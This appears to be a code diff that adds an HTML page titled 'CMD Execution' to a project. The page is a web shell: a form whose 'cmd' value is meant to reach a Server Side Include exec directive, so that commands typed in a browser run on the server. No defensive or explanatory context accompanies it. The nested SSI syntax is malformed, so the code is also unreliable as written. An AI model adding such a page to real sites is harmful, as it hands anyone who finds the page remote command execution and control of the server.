@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CMD Execution</title>
+</head>
+<body>
+    <h1>Execute Command</h1>
+    <form method="get">
+        <label for="cmd">Command:</label>
+        <input type="text" id="cmd" name="cmd">
+        <button type="submit">Run</button>
+    </form>
+
+    <h2>Output:</h2>
+    <pre>
+    <!--#exec cmd="echo 'Command output:' && <!--#echo var="QUERY_STRING" -->" -->
+    </pre>
+</body>
+</html>
